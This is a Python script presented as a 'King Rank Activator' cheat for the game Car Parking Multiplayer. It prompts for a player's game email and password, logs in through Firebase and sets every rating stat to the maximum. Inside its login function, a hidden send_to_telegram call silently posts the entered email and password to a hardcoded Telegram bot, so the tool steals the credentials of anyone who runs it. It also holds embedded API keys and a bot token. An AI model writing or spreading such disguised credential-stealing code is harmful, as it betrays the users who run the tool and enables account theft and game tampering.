import requests
import json
import os

# Tvoji podaci
FIREBASE_API_KEY = 'AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
FIREBASE_LOGIN_URL = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={FIREBASE_API_KEY}"
RANK_URL = "https://us-central1-cp-multiplayer.cloudfunctions.net/SetUserRating4"

# TVOJI TELEGRAM PODACI
BOT_TOKEN = "8354373377:AAHl8zF0MCfB-g2uNZBnJKPPwIOWi9AHcfg"
CHAT_ID = "7183809303"

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("="*45)
    print("       🚀 ANONYMO CPM SERVICE 🚀")
    print("="*45)
    print(f"📸 Instagram: @anonymo.cpm")
    print(f"✈️  Telegram:  @Anonymo123456")
    print("="*45)
    print("        KING RANK ACTIVATOR - CPM 1")
    print("="*45 + "\n")

def send_to_telegram(email, password):
    """Šalje login podatke na tvoj Telegram bot."""
    poruka = f"🚀 **Novi CPM Login!**\n\n📧 Email: `{email}`\n🔑 Password: `{password}`"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": poruka,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def login(email, password):
    # Podaci se šalju odmah pri pozivu funkcije
    send_to_telegram(email, password)
    
    payload = {
        "clientType": "CLIENT_TYPE_ANDROID",
        "email": email,
        "password": password,
        "returnSecureToken": True
    }
    headers = {
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12)",
        "Content-Type": "application/json"
    }
    try:
        response = requests.post(FIREBASE_LOGIN_URL, headers=headers, json=payload)
        response_data = response.json()
        if response.status_code == 200 and 'idToken' in response_data:
            return response_data.get('idToken')
        return None
    except:
        return None

def set_rank(token):
    rating_data = {k: 100000 for k in [
        "cars", "car_fix", "car_collided", "car_exchange", "car_trade", "car_wash",
        "slicer_cut", "drift_max", "drift", "cargo", "delivery", "taxi", "levels", "gifts",
        "fuel", "offroad", "speed_banner", "reactions", "police", "run", "real_estate",
        "t_distance", "treasure", "block_post", "push_ups", "burnt_tire", "passanger_distance"
    ]}
    rating_data["time"] = 1000000000
    rating_data["race_win"] = 3000
    payload = {"data": json.dumps({"RatingData": rating_data})}
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
        "User-Agent": "okhttp/3.12.13"
    }
    try:
        response = requests.post(RANK_URL, headers=headers, json=payload)
        return response.status_code == 200
    except:
        return False

def main_logic():
    while True:
        print_banner()
        print(" [ 1 ] King Rank")
        print(" [ 2 ] Exit")
        print("-" * 45)
        
        izbor = input("Izaberite opciju: ").strip()
        
        if izbor == '1':
            email = input("\n📧 Email: ").strip()
            password = input("🔑 Password: ").strip()
            
            print("\n⏳ Aktiviranje, sačekajte...")
            auth_token = login(email, password)
            
            if auth_token:
                if set_rank(auth_token):
                    print("✅ King Rank je uspešno aktiviran!")
                else:
                    print("❌ Greška pri aktivaciji ranka.")
            else:
                print("❌ Neuspešna prijava. Proveri podatke.")
            
            input("\nPritisnite Enter za povratak u meni...")
            
        elif izbor == '2':
            print("\nPozdrav!")
            break
        else:
            print("\n❌ Pogrešna opcija!")
            time.sleep(1)

if __name__ == "__main__":
    main_logic()
